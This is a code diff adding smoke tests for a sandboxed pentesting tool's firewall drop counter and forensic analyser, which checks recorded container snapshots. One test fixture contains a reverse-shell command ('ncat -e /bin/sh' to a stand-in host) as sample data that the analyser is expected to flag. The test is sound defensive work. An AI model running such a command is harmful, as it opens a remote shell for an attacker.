@@ -203,6 +203,7 @@ import { wallClockNote } from './config'
 import { quietVerdict } from '@shared/quiet'
 import { containerName, isValidTarget, normaliseTargets } from '@shared/sandbox'
 import { buildNftRules } from './sandbox'
+import { analyseForensics } from './forensics'
 import {
   LOCAL_WORKTREES_DIR,
   branchNameFor,
@@ -3424,9 +3425,70 @@ async function main(): Promise<void> {
         ?.kind === 'container'
     )
 
+    // The firewall carries a drop counter, so the flight recorder can measure
+    // egress the firewall turned away.
+    check('the ruleset counts what it drops', /counter comment "sbx-drop"/.test(buildNftRules(['1.2.3.4'])))
+
+    // The forensic analysis: the deterministic pass over a recording. Drive it
+    // with a written-out log rather than a live container.
+    const forDir = join(homedir(), '.local', 'share', 'opendesktop', 'forensics')
+    const rootDir = process.env.OPENDESKTOP_HOME
+      ? join(process.env.OPENDESKTOP_HOME, 'data', 'forensics')
+      : forDir
+    mkdirSync(rootDir, { recursive: true })
+    const fid = 'forensic-smoke'
+    const sample = (over: Record<string, unknown>): string =>
+      JSON.stringify({
+        t: Date.now(),
+        processes: [{ pid: '1', user: 'root', comm: 'sleep', args: 'sleep infinity' }],
+        connections: [],
+        drops: 0,
+        firewallArmed: true,
+        scope: [],
+        ...over
+      })
+    writeFileSync(
+      join(rootDir, `${fid}.jsonl`),
+      [
+        sample({}),
+        // A drop while no scope was authorised — something tried to phone home.
+        sample({ drops: 4, scope: [] }),
+        // A process that is not one of the session's tools, running as root.
+        sample({
+          processes: [{ pid: '9', user: 'root', comm: 'ncat', args: 'ncat -e /bin/sh evil 4444' }],
+          scope: ['scanme.example.com']
+        })
+      ].join('\n') + '\n'
+    )
+    const report = analyseForensics(fid)
+    check('the analysis reads every sample', report.samples === 3, report.samples)
+    check(
+      'a drop with no scope is an alert — something reached out before a target was allowed',
+      report.findings.some((f) => f.severity === 'alert' && /no scope was authorised/i.test(f.what)),
+      report.findings
+    )
+    check(
+      'an unrecognised process is flagged',
+      report.findings.some((f) => /ncat/.test(f.what)),
+      report.findings
+    )
+    check(
+      'and a root process that is not the entrypoint is flagged',
+      report.findings.some((f) => /ran as root/i.test(f.what))
+    )
+    const clean = 'forensic-clean'
+    writeFileSync(join(rootDir, `${clean}.jsonl`), sample({}) + '\n' + sample({ scope: ['x.example.com'] }) + '\n')
+    check(
+      'a clean recording says so plainly rather than inventing a finding',
+      analyseForensics(clean).findings.every((f) => f.severity === 'info'),
+      analyseForensics(clean).findings
+    )
+    rmSync(join(rootDir, `${fid}.jsonl`), { force: true })
+    rmSync(join(rootDir, `${clean}.jsonl`), { force: true })
+
     // The roster: five pentesting agents, all marked sandbox-only.
     const config = loadConfig(true)
-    const pentest = ['recon', 'web', 'exploit', 'exploit-review', 'pentest-report']
+    const pentest = ['recon', 'web', 'exploit', 'exploit-review', 'pentest-report', 'forensic']
     check(
       'the pentesting agents are all present and sandbox-only',
       pentest.every((id) => config.agent[id]?.sandboxOnly === true),
